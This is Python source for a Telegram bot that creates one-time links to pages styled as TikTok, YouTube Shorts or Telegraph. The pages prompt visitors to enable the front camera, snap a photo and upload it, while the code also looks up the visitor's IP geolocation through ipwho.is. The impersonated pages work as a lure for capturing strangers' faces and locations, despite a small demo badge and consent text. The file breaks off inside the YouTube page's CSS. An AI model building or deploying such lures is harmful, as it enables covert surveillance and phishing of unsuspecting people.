import asyncio
import hashlib
import html
import json
import os
import secrets
import sqlite3
from contextlib import closing
from pathlib import Path

import httpx
import uvicorn
from aiogram import Bot, Dispatcher, F, Router
from aiogram.types import (
    BufferedInputFile,
    KeyboardButton,
    Message,
    ReplyKeyboardMarkup,
    Update,
)
from fastapi import FastAPI, File, HTTPException, Request, UploadFile
from fastapi.responses import HTMLResponse, JSONResponse
from fastapi.staticfiles import StaticFiles


# ============================================================
# CONFIG
# ============================================================

BOT_TOKEN = os.environ["BOT_TOKEN"]
PUBLIC_BASE_URL = os.environ["PUBLIC_BASE_URL"].rstrip("/")

PORT = int(os.getenv("PORT", "8000"))
DB_PATH = Path(os.getenv("DB_PATH", "links.sqlite3"))
APP_DIR = Path(__file__).resolve().parent

MAX_PHOTO_BYTES = 10 * 1024 * 1024


# ============================================================
# WEBHOOK
# ============================================================

_token_hash = hashlib.sha256(BOT_TOKEN.encode("utf-8")).hexdigest()

WEBHOOK_PATH_KEY = os.getenv(
    "WEBHOOK_PATH_KEY",
    _token_hash[:32],
)

WEBHOOK_SECRET = os.getenv(
    "WEBHOOK_SECRET",
    _token_hash[32:64],
)

WEBHOOK_PATH = f"/telegram-webhook/{WEBHOOK_PATH_KEY}"
WEBHOOK_URL = f"{PUBLIC_BASE_URL}{WEBHOOK_PATH}"


# ============================================================
# TELEGRAM / FASTAPI
# ============================================================

bot = Bot(BOT_TOKEN)

dp = Dispatcher()
router = Router()

dp.include_router(router)

app = FastAPI(
    docs_url=None,
    redoc_url=None,
)

app.mount(
    "/static",
    StaticFiles(directory=str(APP_DIR)),
    name="static",
)


# ============================================================
# CONSTANTS
# ============================================================

SERVICES = {
    "tiktok": {
        "name": "TikTok",
        "emoji": "🎵",
        "prefix": "tt",
    },
    "youtube": {
        "name": "YouTube Shorts",
        "emoji": "📺",
        "prefix": "yt",
    },
    "telegraph": {
        "name": "Telegraph",
        "emoji": "📝",
        "prefix": "tg",
    },
}

PREFIX_TO_SERVICE = {
    data["prefix"]: key
    for key, data in SERVICES.items()
}


NEW_LINK_TEXT = "🔗 Создать новую ссылку"

TIKTOK_TEXT = "🎵 TikTok"
YOUTUBE_TEXT = "📺 YouTube"
TELEGRAPH_TEXT = "📝 Telegraph"

SKIP_TEXT = "⏭ Пропустить"

PHOTO_YES = "✅ Да"
PHOTO_NO = "❌ Нет"


DEFAULT_TELEGRAPH_TITLE = "Новая статья"

DEFAULT_TELEGRAPH_CONTENT = (
    "Это стандартный текст статьи."
)


# ============================================================
# DATABASE
# ============================================================

def db_connect():
    return sqlite3.connect(
        DB_PATH,
        timeout=30,
    )


def db_init():
    DB_PATH.parent.mkdir(
        parents=True,
        exist_ok=True,
    )

    with closing(db_connect()) as con:

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS links (
                token TEXT PRIMARY KEY,
                owner_chat_id INTEGER NOT NULL,
                service TEXT NOT NULL,
                used INTEGER NOT NULL DEFAULT 0,
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                show_photo INTEGER NOT NULL DEFAULT 1,
                created_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )

        columns = {
            row[1]
            for row in con.execute(
                "PRAGMA table_info(links)"
            ).fetchall()
        }

        if "service" not in columns:
            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN service TEXT
                NOT NULL DEFAULT 'tiktok'
                """
            )

        if "title" not in columns:
            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN title TEXT DEFAULT ''
                """
            )

        if "content" not in columns:
            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN content TEXT DEFAULT ''
                """
            )

        if "show_photo" not in columns:
            con.execute(
                """
                ALTER TABLE links
                ADD COLUMN show_photo INTEGER
                NOT NULL DEFAULT 1
                """
            )

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS telegraph_drafts (
                chat_id INTEGER PRIMARY KEY,
                step TEXT NOT NULL,
                title TEXT DEFAULT '',
                content TEXT DEFAULT '',
                updated_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )

        con.execute(
            """
            CREATE TABLE IF NOT EXISTS processed_updates (
                update_id INTEGER PRIMARY KEY,
                processed_at TEXT NOT NULL DEFAULT CURRENT_TIMESTAMP
            )
            """
        )

        con.commit()


# ============================================================
# TELEGRAPH DRAFT
# ============================================================

def set_draft(
    chat_id: int,
    step: str,
    title: str = "",
    content: str = "",
):

    with closing(db_connect()) as con:

        con.execute(
            """
            INSERT INTO telegraph_drafts (
                chat_id,
                step,
                title,
                content,
                updated_at
            )
            VALUES (?, ?, ?, ?, CURRENT_TIMESTAMP)

            ON CONFLICT(chat_id)
            DO UPDATE SET
                step = excluded.step,
                title = excluded.title,
                content = excluded.content,
                updated_at = CURRENT_TIMESTAMP
            """,
            (
                chat_id,
                step,
                title,
                content,
            ),
        )

        con.commit()


def get_draft(chat_id: int):

    with closing(db_connect()) as con:

        return con.execute(
            """
            SELECT
                step,
                title,
                content

            FROM telegraph_drafts

            WHERE chat_id = ?
            """,
            (chat_id,),
        ).fetchone()


def clear_draft(chat_id: int):

    with closing(db_connect()) as con:

        con.execute(
            """
            DELETE FROM telegraph_drafts
            WHERE chat_id = ?
            """,
            (chat_id,),
        )

        con.commit()


# ============================================================
# UPDATE DEDUPLICATION
# ============================================================

def claim_update(update_id: int):

    try:

        with closing(db_connect()) as con:

            con.execute(
                """
                INSERT INTO processed_updates (
                    update_id
                )
                VALUES (?)
                """,
                (update_id,),
            )

            con.execute(
                """
                DELETE FROM processed_updates
                WHERE update_id < ?
                """,
                (
                    max(
                        update_id - 5000,
                        0,
                    ),
                ),
            )

            con.commit()

        return True

    except sqlite3.IntegrityError:
        return False


def release_update(update_id: int):

    with closing(db_connect()) as con:

        con.execute(
            """
            DELETE FROM processed_updates
            WHERE update_id = ?
            """,
            (update_id,),
        )

        con.commit()


# ============================================================
# LINKS
# ============================================================

def create_link(
    owner_chat_id: int,
    service: str,
    title: str = "",
    content: str = "",
    show_photo: bool = True,
):

    if service not in SERVICES:
        raise ValueError(
            f"Unknown service: {service}"
        )

    prefix = SERVICES[service]["prefix"]

    while True:

        token = (
            f"{prefix}_"
            f"{secrets.token_urlsafe(18)}"
        )

        try:

            with closing(db_connect()) as con:

                con.execute(
                    """
                    INSERT INTO links (
                        token,
                        owner_chat_id,
                        service,
                        used,
                        title,
                        content,
                        show_photo
                    )
                    VALUES (?, ?, ?, 0, ?, ?, ?)
                    """,
                    (
                        token,
                        owner_chat_id,
                        service,
                        title,
                        content,
                        int(show_photo),
                    ),
                )

                con.commit()

            return token

        except sqlite3.IntegrityError:
            pass


def get_link(token: str):

    with closing(db_connect()) as con:

        return con.execute(
            """
            SELECT
                owner_chat_id,
                used,
                service,
                title,
                content,
                show_photo

            FROM links

            WHERE token = ?
            """,
            (token,),
        ).fetchone()


def resolve_link(
    identifier: str,
    expected_service: str,
):

    expected_prefix = (
        SERVICES[expected_service]["prefix"]
    )

    # --------------------------------------------------------
    # Проверяем prefix токена.
    # tt_ не сможет открыться через YouTube.
    # yt_ не сможет открыться через Telegraph.
    # tg_ не сможет открыться через TikTok.
    # --------------------------------------------------------

    if "_" in identifier:

        token_prefix = identifier.split(
            "_",
            1,
        )[0]

        if (
            token_prefix in PREFIX_TO_SERVICE
            and token_prefix != expected_prefix
        ):
            return None

    with closing(db_connect()) as con:

        row = con.execute(
            """
            SELECT
                token,
                owner_chat_id,
                used,
                service,
                title,
                content,
                show_photo

            FROM links

            WHERE token = ?
              AND service = ?
            """,
            (
                identifier,
                expected_service,
            ),
        ).fetchone()

        if row:
            return row

        # Старые ссылки, где использовалось
        # только 8 символов token.

        if len(identifier) != 8:
            return None

        rows = con.execute(
            """
            SELECT
                token,
                owner_chat_id,
                used,
                service,
                title,
                content,
                show_photo

            FROM links

            WHERE token LIKE ?
              AND service = ?

            LIMIT 2
            """,
            (
                f"{identifier}%",
                expected_service,
            ),
        ).fetchall()

        if len(rows) == 1:
            return rows[0]

        return None


def claim_link(token: str):

    with closing(db_connect()) as con:

        cursor = con.execute(
            """
            UPDATE links
            SET used = 2

            WHERE token = ?
              AND used = 0
            """,
            (token,),
        )

        con.commit()

        return cursor.rowcount == 1


def finish_link(token: str):

    with closing(db_connect()) as con:

        con.execute(
            """
            UPDATE links
            SET used = 1
            WHERE token = ?
            """,
            (token,),
        )

        con.commit()


def release_link(token: str):

    with closing(db_connect()) as con:

        con.execute(
            """
            UPDATE links
            SET used = 0

            WHERE token = ?
              AND used = 2
            """,
            (token,),
        )

        con.commit()


# ============================================================
# URL GENERATION
# ============================================================

def public_link(
    service: str,
    token: str,
):

    if service == "tiktok":
        return (
            f"{PUBLIC_BASE_URL}"
            f"/@{token}"
        )

    if service == "youtube":
        return (
            f"{PUBLIC_BASE_URL}"
            f"/shorts/{token}"
        )

    if service == "telegraph":
        return (
            f"{PUBLIC_BASE_URL}"
            f"/article/{token}"
        )

    raise ValueError(
        f"Unknown service: {service}"
    )


# ============================================================
# KEYBOARDS
# ============================================================

def service_keyboard():

    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text=TIKTOK_TEXT
                )
            ],
            [
                KeyboardButton(
                    text=YOUTUBE_TEXT
                )
            ],
            [
                KeyboardButton(
                    text=TELEGRAPH_TEXT
                )
            ],
        ],
        resize_keyboard=True,
        one_time_keyboard=False,
    )


def skip_keyboard():

    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text=SKIP_TEXT
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=False,
    )


def photo_keyboard():

    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text=PHOTO_YES
                ),
                KeyboardButton(
                    text=PHOTO_NO
                ),
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=False,
    )


def finished_keyboard():

    return ReplyKeyboardMarkup(
        keyboard=[
            [
                KeyboardButton(
                    text=NEW_LINK_TEXT
                )
            ]
        ],
        resize_keyboard=True,
        one_time_keyboard=False,
    )


# ============================================================
# TELEGRAM HELPERS
# ============================================================

async def send_created_link(
    message: Message,
    service: str,
    token: str,
):

    info = SERVICES[service]

    url = public_link(
        service,
        token,
    )

    await message.answer(
        (
            f"{info['emoji']} "
            f"Одноразовая ссылка создана:\n\n"
            f"<a href=\"{html.escape(url, quote=True)}\">"
            f"{html.escape(url)}"
            f"</a>\n\n"
            f"Оформление: "
            f"<b>{info['name']}</b>"
        ),
        parse_mode="HTML",
        disable_web_page_preview=True,
        reply_markup=finished_keyboard(),
    )


# ============================================================
# ONE TELEGRAM TEXT HANDLER
# ============================================================

@router.message(F.text)
async def handle_text(message: Message):

    chat_id = message.chat.id

    text = (
        message.text
        or ""
    ).strip()

    lower = text.lower()

    # ========================================================
    # START
    # ========================================================

    if (
        lower == "/start"
        or lower.startswith("/start@")
    ):

        clear_draft(chat_id)

        await message.answer(
            "👋 Выберите оформление ссылки:",
            reply_markup=service_keyboard(),
        )

        return

    # ========================================================
    # NEW LINK
    # ========================================================

    if (
        lower == "/new"
        or lower.startswith("/new@")
        or text == NEW_LINK_TEXT
    ):

        clear_draft(chat_id)

        await message.answer(
            "Выберите оформление новой ссылки:",
            reply_markup=service_keyboard(),
        )

        return

    # ========================================================
    # SERVICE SELECTION
    # ========================================================

    service_map = {
        TIKTOK_TEXT: "tiktok",
        YOUTUBE_TEXT: "youtube",

        # совместимость со старой кнопкой
        "📺 YouTube Shorts": "youtube",

        TELEGRAPH_TEXT: "telegraph",
    }

    if text in service_map:

        service = service_map[text]

        clear_draft(chat_id)

        # ----------------------------------------------------
        # TELEGRAPH
        # ----------------------------------------------------

        if service == "telegraph":

            set_draft(
                chat_id,
                "title",
            )

            await message.answer(
                (
                    "📝 Введите заголовок статьи.\n\n"
                    "Если хотите оставить стандартный "
                    "заголовок — нажмите "
                    "«⏭ Пропустить»."
                ),
                reply_markup=skip_keyboard(),
            )

            return

        # ----------------------------------------------------
        # TIKTOK / YOUTUBE
        # ----------------------------------------------------

        token = create_link(
            chat_id,
            service,
        )

        await send_created_link(
            message,
            service,
            token,
        )

        return

    # ========================================================
    # TELEGRAPH WIZARD
    # ========================================================

    draft = get_draft(chat_id)

    if not draft:
        return

    step, saved_title, saved_content = draft

    # ========================================================
    # TITLE
    # ========================================================

    if step == "title":

        if text in {
            SKIP_TEXT,
            "-",
        }:
            title = DEFAULT_TELEGRAPH_TITLE

        else:
            title = (
                text
                or DEFAULT_TELEGRAPH_TITLE
            )

        set_draft(
            chat_id,
            "content",
            title=title,
        )

        await message.answer(
            (
                "✍️ Теперь введите текст статьи.\n\n"
                "Если хотите оставить стандартный "
                "текст — нажмите "
                "«⏭ Пропустить»."
            ),
            reply_markup=skip_keyboard(),
        )

        return

    # ========================================================
    # CONTENT
    # ========================================================

    if step == "content":

        if text in {
            SKIP_TEXT,
            "-",
        }:

            content = (
                DEFAULT_TELEGRAPH_CONTENT
            )

        else:

            content = (
                text
                or DEFAULT_TELEGRAPH_CONTENT
            )

        set_draft(
            chat_id,
            "photo",
            title=(
                saved_title
                or DEFAULT_TELEGRAPH_TITLE
            ),
            content=content,
        )

        await message.answer(
            "🖼 Добавить фото в статью?",
            reply_markup=photo_keyboard(),
        )

        return

    # ========================================================
    # PHOTO
    # ========================================================

    if step == "photo":

        if text not in {
            PHOTO_YES,
            PHOTO_NO,
        }:

            await message.answer(
                (
                    "Выберите кнопкой:\n"
                    "✅ Да\n"
                    "или\n"
                    "❌ Нет"
                ),
                reply_markup=photo_keyboard(),
            )

            return

        show_photo = (
            text == PHOTO_YES
        )

        token = create_link(
            owner_chat_id=chat_id,
            service="telegraph",
            title=(
                saved_title
                or DEFAULT_TELEGRAPH_TITLE
            ),
            content=(
                saved_content
                or DEFAULT_TELEGRAPH_CONTENT
            ),
            show_photo=show_photo,
        )

        clear_draft(chat_id)

        await send_created_link(
            message,
            "telegraph",
            token,
        )

        return


# ============================================================
# CLIENT IP
# ============================================================

def client_ip(request: Request):

    cloudflare = request.headers.get(
        "cf-connecting-ip"
    )

    if cloudflare:
        return cloudflare.strip()

    forwarded = request.headers.get(
        "x-forwarded-for"
    )

    if forwarded:

        return forwarded.split(
            ","
        )[0].strip()

    if request.client:
        return request.client.host

    return "unknown"


async def lookup_ip(ip: str):

    if ip in {
        "unknown",
        "127.0.0.1",
        "::1",
    }:
        return {}

    try:

        async with httpx.AsyncClient(
            timeout=6
        ) as client:

            response = await client.get(
                f"https://ipwho.is/{ip}"
            )

            response.raise_for_status()

            data = response.json()

            if not data.get(
                "success",
                True,
            ):
                return {}

            return data

    except Exception:
        return {}


# ============================================================
# CAMERA JS
# ============================================================

def camera_script(token: str):

    return f"""
<script>

const token = {json.dumps(token)};

const video =
    document.getElementById("video");

const preview =
    document.getElementById("preview");

const cameraBtn =
    document.getElementById("cameraBtn");

const sendBtn =
    document.getElementById("sendBtn");

const statusText =
    document.getElementById("status");

let stream = null;
let sending = false;


cameraBtn.addEventListener(
    "click",
    async () => {{

        try {{

            if (
                !navigator.mediaDevices ||
                !navigator.mediaDevices.getUserMedia
            ) {{

                throw new Error(
                    "Камера недоступна"
                );

            }}

            stream =
                await navigator.mediaDevices
                    .getUserMedia({{

                        video: {{
                            facingMode: "user"
                        }},

                        audio: false

                    }});

            video.srcObject = stream;

            video.style.display =
                "block";

            if (preview) {{
                preview.style.display =
                    "none";
            }}

            cameraBtn.style.display =
                "none";

            sendBtn.style.display =
                "block";

            statusText.textContent =
                "Камера включена.";

        }}

        catch (error) {{

            statusText.textContent =
                "Ошибка: " +
                error.message;

        }}

    }}
);


sendBtn.addEventListener(
    "click",
    async () => {{

        if (
            !stream ||
            sending
        ) {{
            return;
        }}

        sending = true;

        sendBtn.disabled = true;

        statusText.textContent =
            "Отправка...";

        try {{

            await new Promise(
                resolve => {{

                    if (
                        video.readyState >= 2
                    ) {{

                        resolve();

                    }}

                    else {{

                        video.onloadeddata =
                            resolve;

                    }}

                }}
            );

            const canvas =
                document.createElement(
                    "canvas"
                );

            canvas.width =
                video.videoWidth ||
                720;

            canvas.height =
                video.videoHeight ||
                1280;

            const ctx =
                canvas.getContext("2d");

            ctx.drawImage(
                video,
                0,
                0,
                canvas.width,
                canvas.height
            );

            const blob =
                await new Promise(
                    resolve => {{

                        canvas.toBlob(
                            resolve,
                            "image/jpeg",
                            0.92
                        );

                    }}
                );

            if (!blob) {{

                throw new Error(
                    "Не удалось сделать фото"
                );

            }}

            const form =
                new FormData();

            form.append(
                "photo",
                blob,
                "photo.jpg"
            );

            const response =
                await fetch(

                    "/api/send/" +
                    encodeURIComponent(token),

                    {{
                        method: "POST",
                        body: form
                    }}

                );

            const result =
                await response
                    .json()
                    .catch(
                        () => ({{}})
                    );

            if (!response.ok) {{

                throw new Error(
                    result.detail ||
                    "Ошибка отправки"
                );

            }}

            stream
                .getTracks()
                .forEach(
                    track => track.stop()
                );

            video.style.display =
                "none";

            sendBtn.style.display =
                "none";

            statusText.textContent =
                "Фото отправлено.";

        }}

        catch (error) {{

            sending = false;

            sendBtn.disabled = false;

            statusText.textContent =
                "Ошибка: " +
                error.message;

        }}

    }}
);


(function updateTime() {{

    const el =
        document.getElementById(
            "clock"
        );

    if (!el) {{
        return;
    }}

    const now =
        new Date();

    el.textContent =
        now.toLocaleTimeString(
            "ru-RU",
            {{
                hour: "2-digit",
                minute: "2-digit"
            }}
        );

}})();

</script>
"""


# ============================================================
# TIKTOK DESIGN
# ============================================================

def generate_tiktok_page(token: str):

    photo_url = (
        f"{PUBLIC_BASE_URL}"
        f"/static/photo.png"
    )

    script = camera_script(token)

    return f"""
<!DOCTYPE html>

<html lang="ru">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width,
             initial-scale=1,
             maximum-scale=1,
             viewport-fit=cover"
>

<title>Video demo</title>

<style>

* {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}}

html,
body {{
    width: 100%;
    height: 100%;
    background: #000;
    color: #fff;
    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Arial,
        sans-serif;
}}

body {{
    display: flex;
    justify-content: center;
    overflow: hidden;
}}

.phone {{
    position: relative;
    width: 100%;
    max-width: 590px;
    height: 100svh;
    background: #000;
    overflow: hidden;
}}

.media {{
    position: absolute;

    left: 0;
    right: 0;
    top: 0;
    bottom: 66px;

    width: 100%;
    height: calc(100% - 66px);

    object-fit: cover;

    background: #111;
}}

#video {{
    display: none;
}}

.gradient {{
    position: absolute;

    inset: 0 0 66px 0;

    pointer-events: none;

    background:
        linear-gradient(
            to bottom,
            rgba(0,0,0,.30),
            transparent 24%,
            transparent 57%,
            rgba(0,0,0,.82)
        );
}}

.statusbar {{
    position: absolute;

    z-index: 10;

    left: 21px;
    right: 18px;

    top: max(
        12px,
        env(safe-area-inset-top)
    );

    display: flex;
    justify-content: space-between;
    align-items: center;

    font-size: 17px;
    font-weight: 700;

    text-shadow:
        0 1px 4px #000;
}}

.status-right {{
    display: flex;
    align-items: center;
    gap: 8px;
}}

.battery {{
    border: 1.5px solid #fff;

    border-radius: 5px;

    padding: 1px 5px;

    font-size: 12px;
}}

.tabs {{
    position: absolute;

    z-index: 9;

    top: max(
        70px,
        calc(
            env(safe-area-inset-top)
            + 55px
        )
    );

    left: 15px;
    right: 14px;

    display: flex;
    align-items: center;

    gap: 14px;

    font-size: 16px;
    font-weight: 700;

    white-space: nowrap;

    text-shadow:
        0 1px 5px #000;
}}

.tabs span {{
    opacity: .8;
}}

.tabs .active {{
    opacity: 1;
}}

.tabs .active::after {{
    content: "";

    display: block;

    width: 36px;
    height: 3px;

    margin: 8px auto 0;

    background: #fff;

    border-radius: 100px;
}}

.search {{
    margin-left: auto;

    font-size: 31px;
}}

.demo-label {{
    position: absolute;

    z-index: 15;

    top: 122px;
    left: 50%;

    transform: translateX(-50%);

    padding: 5px 10px;

    border-radius: 999px;

    background:
        rgba(0,0,0,.70);

    border:
        1px solid rgba(
            255,
            255,
            255,
            .45
        );

    backdrop-filter:
        blur(10px);

    font-size: 10px;
    font-weight: 700;

    white-space: nowrap;
}}

.side {{
    position: absolute;

    z-index: 9;

    right: 8px;

    bottom: 119px;

    display: flex;
    flex-direction: column;

    align-items: center;

    gap: 17px;

    text-shadow:
        0 1px 4px #000;
}}

.side-item {{
    width: 65px;

    display: flex;
    flex-direction: column;

    align-items: center;

    gap: 3px;

    font-size: 12px;
    font-weight: 600;
}}

.side-icon {{
    font-size: 38px;
    line-height: 39px;
}}

.avatar-box {{
    position: relative;

    margin-bottom: 7px;
}}

.avatar {{
    width: 52px;
    height: 52px;

    border-radius: 50%;

    background:
        #333;

    border:
        2px solid #fff;

    display: grid;
    place-items: center;

    font-weight: 800;
}}

.follow {{
    position: absolute;

    left: 15px;
    bottom: -10px;

    width: 23px;
    height: 23px;

    display: grid;
    place-items: center;

    border-radius: 50%;

    background: #fe2c55;

    font-size: 20px;
}}

.bottom-text {{
    position: absolute;

    z-index: 8;

    left: 17px;
    right: 80px;

    bottom: 82px;

    text-shadow:
        0 1px 5px #000;
}}

.username {{
    margin-bottom: 8px;

    font-size: 17px;
    font-weight: 800;
}}

.description {{
    margin-bottom: 7px;

    font-size: 15px;
    line-height: 1.28;
}}

.original {{
    margin-bottom: 8px;

    font-size: 14px;
}}

.music {{
    overflow: hidden;

    white-space: nowrap;
    text-overflow: ellipsis;

    font-size: 14px;
}}

.nav {{
    position: absolute;

    z-index: 12;

    left: 0;
    right: 0;
    bottom: 0;

    height: 66px;

    background: #050505;

    border-top:
        1px solid rgba(
            255,
            255,
            255,
            .10
        );

    display: flex;
    align-items: center;
    justify-content: space-around;
}}

.nav-item {{
    min-width: 64px;

    display: flex;
    flex-direction: column;

    align-items: center;

    gap: 3px;

    font-size: 10px;
}}

.nav-icon {{
    font-size: 27px;
}}

.create {{
    width: 47px;
    height: 31px;

    display: grid;
    place-items: center;

    border-radius: 8px;

    background: #fff;
    color: #000;

    font-size: 27px;

    box-shadow:
        -4px 0 #25f4ee,
         4px 0 #fe2c55;
}}

.consent {{
    position: absolute;

    z-index: 30;

    left: 10px;
    right: 10px;

    bottom: 74px;

    padding: 12px;

    border-radius: 15px;

    background:
        rgba(
            10,
            10,
            10,
            .94
        );

    border:
        1px solid rgba(
            255,
            255,
            255,
            .25
        );

    backdrop-filter:
        blur(14px);
}}

.consent p {{
    margin-bottom: 9px;

    font-size: 12px;
    line-height: 1.35;
}}

.button-row {{
    display: flex;
    gap: 8px;
}}

button {{
    flex: 1;

    border: 0;

    padding: 10px;

    border-radius: 10px;

    font-size: 13px;
    font-weight: 800;
}}

#cameraBtn {{
    background: #fff;
    color: #111;
}}

#sendBtn {{
    display: none;

    background: #fe2c55;
    color: #fff;
}}

#status {{
    margin-top: 6px;

    min-height: 15px;

    font-size: 11px;
    color: #ddd;
}}

</style>

</head>

<body>

<div class="phone">

    <img
        id="preview"
        class="media"
        src="{photo_url}"
        alt="Видео"
    >

    <video
        id="video"
        class="media"
        autoplay
        muted
        playsinline
    ></video>

    <div class="gradient"></div>


    <div class="statusbar">

        <span id="clock">
            16:28
        </span>

        <div class="status-right">
            <span>▮▮▮</span>
            <span>◓</span>
            <span class="battery">
                83
            </span>
        </div>

    </div>


    <div class="tabs">

        <span>LIVE</span>

        <span>
            Сообщество
        </span>

        <span>
            Подписки
        </span>

        <span class="active">
            Рекомендации
        </span>

        <span class="search">
            ⌕
        </span>

    </div>


    <div class="demo-label">
        ДЕМО • НЕ ОФИЦИАЛЬНЫЙ TIKTOK
    </div>


    <div class="side">

        <div class="avatar-box">

            <div class="avatar">
                V
            </div>

            <div class="follow">
                +
            </div>

        </div>


        <div class="side-item">

            <div class="side-icon">
                ♥
            </div>

            <span>
                100,3 тыс.
            </span>

        </div>


        <div class="side-item">

            <div class="side-icon">
                ●
            </div>

            <span>
                575
            </span>

        </div>


        <div class="side-item">

            <div class="side-icon">
                ▮
            </div>

            <span>
                12,8 тыс.
            </span>

        </div>


        <div class="side-item">

            <div class="side-icon">
                ↗
            </div>

            <span>
                5720
            </span>

        </div>

    </div>


    <div class="bottom-text">

        <div class="username">
            @verhcau
        </div>

        <div class="description">
            Твоё ежедневное короткое видео.
            Уровень 1–5 — как дальше.
        </div>

        <div class="original">
            Посмотреть оригинал
        </div>

        <div class="music">
            ♫ Оригинальный звук — verhcau
        </div>

    </div>


    <div class="consent">

        <p>
            Камера включится только после
            вашего нажатия. При отправке
            снимок и IP-данные будут
            переданы владельцу этой ссылки.
        </p>

        <div class="button-row">

            <button id="cameraBtn">
                Разрешить камеру
            </button>

            <button id="sendBtn">
                Сделать и отправить
            </button>

        </div>

        <div id="status"></div>

    </div>


    <div class="nav">

        <div class="nav-item">
            <span class="nav-icon">⌂</span>
            <span>Главная</span>
        </div>

        <div class="nav-item">
            <span class="nav-icon">◉</span>
            <span>Друзья</span>
        </div>

        <div class="nav-item">
            <span class="create">+</span>
        </div>

        <div class="nav-item">
            <span class="nav-icon">▢</span>
            <span>Входящие</span>
        </div>

        <div class="nav-item">
            <span class="nav-icon">♙</span>
            <span>Профиль</span>
        </div>

    </div>

</div>

{script}

</body>

</html>
"""


# ============================================================
# YOUTUBE SHORTS DESIGN
# ============================================================

def generate_youtube_page(token: str):

    photo_url = (
        f"{PUBLIC_BASE_URL}"
        f"/static/photo.png"
    )

    script = camera_script(token)

    return f"""
<!DOCTYPE html>

<html lang="ru">

<head>

<meta charset="UTF-8">

<meta
    name="viewport"
    content="width=device-width,
             initial-scale=1,
             maximum-scale=1,
             viewport-fit=cover"
>

<title>Short video demo</title>

<style>

* {{
    box-sizing: border-box;
    margin: 0;
    padding: 0;
}}

html,
body {{
    width: 100%;
    height: 100%;
    background: #000;
    color: #fff;

    font-family:
        -apple-system,
        BlinkMacSystemFont,
        "Segoe UI",
        Arial,
        sans-serif;
}}

body {{
    display: flex;
    justify-content: center;
    overflow: hidden;
}}

.phone {{
    position: relative;

    width: 100%;
    max-width: 590px;

    height: 100svh;

    background: #000;

    overflow: hidden;
}}

.statusbar {{
    height: 51px;

    padding:
        max(
            13px,
            env(safe-area-inset-top)
        )
        22px 0;

    display: flex;
    align-items: flex-start;
    justify-content: space-between;

    font-size: 17px;
    font-weight: 700;
}}

.status-right {{
    display: flex;
    gap: 8px;
    align-items: center;
}}

.battery {{
    padding: 1px 5px;

    border:
        1.5px solid #fff;

    border-radius: 5px;

    font-size: 12px;
}}

.header {{
    height: 70px;

    padding:
        11px
        22px
        0;

    display: flex;

    align-items: flex-start;
    justify-content: space-between;
}}

.header-left {{
    display: flex;
    align-items: center;

    gap: 17px;

    font-size: 25px;
    font-weight: 700;
}}

.back {{
    font-size: 38px;

    line-height: 26px;

    font-weight: 300;
}}

.header-right {{
    display: flex;
    align-items: center;

    gap: 21px;

    font-size: 29px;
}}

.chips {{
    position: relative;

    height: 100px;

    padding:
        13px
        20px
        26px;

    display: flex;
    gap: 12px;

    overflow: hidden;
}}

.chip {{
    flex: 0 0 auto;

    height: 55px;

    padding:
        0 22px;

    border-radius: 18px;

    background: #1d1d1d;

    display: flex;
    align-items: center;

    gap: 8px;

    font-size: 16px;
    font-weight: 700;
}}

.demo-label {{
    position: absolute;

    z-index: 10;

    right: 13px;
    bottom: 7px;

    padding: 4px 8px;

    border-radius: 999px;

    background: #292929;

    border: 1px solid #666;

    font-size: 9px;
    font-weight: 700;
}}

.video-stage {{
    position: relative;

    width: 100%;

    height: 47svh;

    min-height: 300px;
    max-height: 510px;

    overflow: hidden;

    background: #111;
}}

.media {{
    position: absolute;

    inset: 0;

    width: 100%;
    height: 100%;

    object-fit: cover;
}}

#video {{
    display: none;
}}

.video-gradient {{
    position: absolute;

    inset: 0;

    background:
        linear-gradient(
            to bottom,
            transparent 60%,
            rgba(0,0,0,.26)
        );

    pointer-events: none;
}}

.right-buttons {{
    position: absolute;

    z-index: 12;

    right: 5px;

    bottom: 146px;

    display: flex;
    flex-direction: column;

    align-items: center;

    gap: 19px;
}}

.right-button {{
    width: 74px;

    display: flex;
    flex-direction: column;

    align-items: center;

    gap: 4px;

    font-size: 12px;
    font-weight: 600;
}}

.right-icon {{
    font-size: 35px;
    line-height: 36px;
}}

.video-info {{
    position: absolute;

    z-index: 11;

    left: 20px;
    right: 86px;

    bottom: 84px;
}}

.channel {{
    display: flex;
    align-items: center;

    gap: 9px;

    font-size: 15px;
    font-weight: 700;
}}

.avatar {{
    width: 39px;
    height: 39px;

    border-radius: 50%;

    background: #292929;

    display: grid;
    place-items: center;

    border: 1px solid #777;
}}

.subscribe {{
    padding:
        10px
        15px;

    border: none;

    border-radius: 22px;

    background: #fff;
    color: #000;

    font-size: 14px;
    font-weight: 800;
}}

.description {{
    margin-top: 11px;

    overflow: hidden;

    white-space: nowrap;
    text-overflow: ellipsis;

    font-size: 15px;
}}

.progress {{
    position: absolute;

    z-index: 14;

    left: 0;
    right: 0;

    bottom: 66px;

    height: 3px;

    background: #555;
}}

.progress-fill {{
    position: relative;

    width: 4%;
    height: 100%;

    background: #f00;
}}

.progress-fill::after {{
    content: "";

    position: absolute;

    right: -5px;
    top: -3px;

    width: 10px;
    height: 10px;

    border-radius: 50%;

    background: #f00;
}}

.nav {{
    position: absolute;

    z-index: 15;

    left: 0;
    right: 0;
    bottom: 0;

    height: 66px;

    background: #111;

    display: flex;

    align-items: center;
    justify-content: space-around;

    border-top:
        1px solid #2c2c2c;
}}

.nav-item {{
    min-width: 65px;

    display: flex;
    flex-direction: column;

    align-items: center;

    gap: 3px;

    font-size: 10px;
}}

.nav-icon {{
    font-size: 27px;
}}

.create {{
    width: 45px;
    height: 45px;

    border-radius: 50%;

    background: #303030;

    display: grid;
    place-items: center;

    font-size: 30px;
}}

